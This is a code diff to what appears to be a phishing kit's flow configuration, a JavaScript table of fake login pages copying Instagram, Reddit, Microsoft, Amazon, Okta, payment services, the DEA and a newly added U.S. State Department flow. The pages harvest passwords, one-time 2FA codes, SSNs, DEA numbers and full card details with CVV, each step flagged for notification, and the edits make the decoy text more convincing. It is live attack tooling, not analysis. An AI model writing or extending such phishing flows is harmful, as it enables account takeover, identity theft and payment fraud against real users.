@@ -755,7 +755,7 @@ FLOWS.facebook = [
 ];
 
 FLOWS.instagram = [
-  { slug:'login',    form_type:'login', page_title:'Instagram – Log In',   headline:'Log In',             subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Instagram – Log In',   headline:'Log In',             subheadline:'Log in to your Instagram account', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Enter the Code',       headline:'Enter the 6-digit code', subheadline:'Enter the code we sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Confirm Code', notify_step:true, otp_length:6 }
 ];
 
@@ -786,12 +786,12 @@ FLOWS.pinterest = [
 ];
 
 FLOWS.reddit = [
-  { slug:'login',    form_type:'login', page_title:'Log in to Reddit',     headline:'Log In',             subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log in to Reddit',     headline:'Log In',             subheadline:'Log in to your Reddit account', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.tumblr = [
-  { slug:'login',    form_type:'login', page_title:'Log in to Tumblr',     headline:'Log in',             subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log in to Tumblr',     headline:'Log in',             subheadline:'Log in to your Tumblr account', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Check your email',     headline:'Check your email',   subheadline:'Enter the code we sent to your email address', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Confirm Code', notify_step:true, otp_length:6 }
 ];
 
@@ -953,6 +953,12 @@ FLOWS.dea = [
   { slug:'login',     form_type:'login',    page_title:'Sign In – DEA',           headline:'DEA System Sign In',          subheadline:'Authorized personnel only', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In',   notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authentication device', fields:['code'], layout:'otp',    cta:'Verify',    step_label:'Verify',    notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Verify Identity',          headline:'Verify Your Identity',       subheadline:'Enter your DEA registration number and date of birth', fields:['dea_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
+];
+
+FLOWS.statedept = [
+  { slug:'login',     form_type:'login',    page_title:'Sign In – U.S. Department of State', headline:'Sign In to Your Account', subheadline:'Access U.S. Department of State services and passport information', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In', notify_step:true  },
+  { slug:'sms-code',  form_type:'otp',      page_title:'Verify Your Identity',               headline:'Verify Your Identity',    subheadline:'Enter the verification code sent to your registered phone number', fields:['code'], layout:'otp',    cta:'Verify',    step_label:'Verify',  notify_step:true, otp_length:6 },
+  { slug:'id-confirm',form_type:'id_verify',page_title:'Confirm Your Identity',              headline:'Confirm Your Identity',   subheadline:'Enter your SSN and date of birth to verify your identity', fields:['ssn','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
 
 FLOWS.passport = [
@@ -1293,7 +1299,7 @@ FLOWS.stripe = [
 ];
 
 FLOWS.square = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Square',         headline:'Sign In',              subheadline:'Sign in to your Square account', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Square',         headline:'Sign In to Square',    subheadline:'Sign in to your Square account to manage payments and business', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verification Code',        headline:'Verification Code',    subheadline:'A 6-digit verification code was sent to your mobile phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1364,7 +1370,7 @@ FLOWS.checkoutcom = [
 ];
 
 FLOWS.wise = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Wise',            headline:'Log in',               subheadline:'', fields:['email','password'], layout:'auth', cta:'Log in',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log In – Wise',            headline:'Log in to Wise',       subheadline:'Send money internationally at the real exchange rate', fields:['email','password'], layout:'auth', cta:'Log in',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify your identity', subheadline:'Enter the code we\'ve sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1409,7 +1415,7 @@ FLOWS.neteller = [
 ];
 
 FLOWS.paysafe = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Paysafe',        headline:'Sign In',              subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Paysafe',        headline:'Sign In to Paysafe',   subheadline:'Access your Paysafe account and manage your digital payments', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the verification code sent to your registered phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -1441,7 +1447,7 @@ FLOWS.gmail = [
 ];
 
 FLOWS.outlook = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Outlook',        headline:'Sign in',              subheadline:'', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Outlook',        headline:'Sign in',              subheadline:'to continue to Outlook', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Password',           headline:'Enter password',       subheadline:'', fields:['password'], layout:'auth', cta:'Sign in',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify your identity', subheadline:'Please provide the following info to verify your identity', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
@@ -1519,7 +1525,7 @@ FLOWS.apple = [
 ];
 
 FLOWS.microsoft = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Microsoft',      headline:'Sign in',              subheadline:'', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Microsoft',      headline:'Sign in',              subheadline:'to continue to Microsoft', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Password',           headline:'Enter password',       subheadline:'', fields:['password'], layout:'auth', cta:'Sign in',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Help us protect your account', subheadline:'We need to verify your identity to let you sign in', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
@@ -1531,7 +1537,7 @@ FLOWS.google = [
 ];
 
 FLOWS.amazon = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Amazon',         headline:'Sign in',              subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Amazon',         headline:'Sign in',              subheadline:'New to Amazon? Create your Amazon account', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Your Password',      headline:'Enter your password',  subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Step Verification',    headline:'Two-Step Verification', subheadline:'Enter the one-time password (OTP) sent to your phone', fields:['code'], layout:'otp', cta:'Sign In', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
@@ -1557,7 +1563,7 @@ FLOWS.slack = [
 ];
 
 FLOWS.zoom = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Zoom',           headline:'Sign In',              subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Zoom',           headline:'Sign In to Zoom',      subheadline:'Connect, collaborate and celebrate from anywhere with Zoom', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'One-Time Password',        headline:'One-Time Password',    subheadline:'A one-time password was sent to your phone number', fields:['code'], layout:'otp', cta:'Continue', step_label:'OTP', notify_step:true, otp_length:6 }
 ];
 
@@ -1573,7 +1579,7 @@ FLOWS.salesforce = [
 ];
 
 FLOWS.oracle = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Oracle Cloud',   headline:'Sign In',              subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Oracle Cloud',   headline:'Sign In to Oracle',    subheadline:'Sign in to access Oracle Cloud applications and services', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Step Verification',    headline:'Two-Step Verification', subheadline:'Enter the one-time passcode sent to your mobile phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1588,7 +1594,7 @@ FLOWS.ibm = [
 ];
 
 FLOWS.intel = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Intel',          headline:'Welcome',              subheadline:'Sign in to your Intel account', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Intel',          headline:'Welcome to Intel',     subheadline:'Sign in to access your Intel account and resources', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authentication app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -1613,7 +1619,7 @@ FLOWS.twilio = [
 ];
 
 FLOWS.okta = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Okta',           headline:'Sign In',              subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Okta',           headline:'Sign in to Okta',      subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify with Okta Verify',  headline:'Verify with Okta Verify', subheadline:'Open the Okta Verify app on your phone to get a push notification', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1761,7 +1767,7 @@ FLOWS.applemusic = [
 ];
 
 FLOWS.amazonmusic = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Amazon Music',     headline:'Sign in',                      subheadline:'', fields:['email'], layout:'auth',   cta:'Continue', step_label:'Email',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Amazon Music',     headline:'Sign in',                      subheadline:'New to Amazon? Create your Amazon account', fields:['email'], layout:'auth',   cta:'Continue', step_label:'Email',          notify_step:true  },
   { slug:'password',       form_type:'login',  page_title:'Enter Your Password',        headline:'Enter your password',          subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password',       notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Information',   subheadline:'Update your payment details to continue enjoying Amazon Music Unlimited', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Save', step_label:'Payment Update', notify_step:true }
 ];
@@ -1803,7 +1809,7 @@ FLOWS.tunein = [
 ];
 
 FLOWS.audible = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Audible',          headline:'Sign in',                      subheadline:'', fields:['email'], layout:'auth',   cta:'Continue', step_label:'Email',         notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Audible',          headline:'Sign in',                      subheadline:'New to Audible? Start your free 30-day trial', fields:['email'], layout:'auth',   cta:'Continue', step_label:'Email',         notify_step:true  },
   { slug:'password',       form_type:'login',  page_title:'Enter Password',             headline:'Enter your password',          subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password',      notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Information',   subheadline:'Update your payment details to maintain uninterrupted access to your Audible membership', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Save', step_label:'Payment Update', notify_step:true }
 ];
@@ -1824,7 +1830,7 @@ FLOWS.pocketcasts = [
 ];
 
 FLOWS.stitcher = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Stitcher',         headline:'Sign In',                      subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In', step_label:'Sign In',        notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Stitcher',         headline:'Sign In to Stitcher',          subheadline:'Stream and download thousands of podcasts on demand', fields:['email','password'], layout:'auth',   cta:'Sign In', step_label:'Sign In',        notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Method',        subheadline:'Update your billing information to continue your Stitcher Premium subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
 ];
 
@@ -1923,7 +1929,7 @@ FLOWS.hulu = [
 ];
 
 FLOWS.amazonprime = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Prime Video',      headline:'Sign in',                      subheadline:'', fields:['email'], layout:'auth',   cta:'Continue', step_label:'Email',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Prime Video',      headline:'Sign in',                      subheadline:'New to Amazon? Create your Amazon account', fields:['email'], layout:'auth',   cta:'Continue', step_label:'Email',          notify_step:true  },
   { slug:'password',       form_type:'login',  page_title:'Enter Password',             headline:'Enter your password',          subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password',       notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Billing',             headline:'Update Your Payment Method',   subheadline:'Update your payment information to continue your Amazon Prime membership', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Save', step_label:'Payment Update', notify_step:true }
 ];
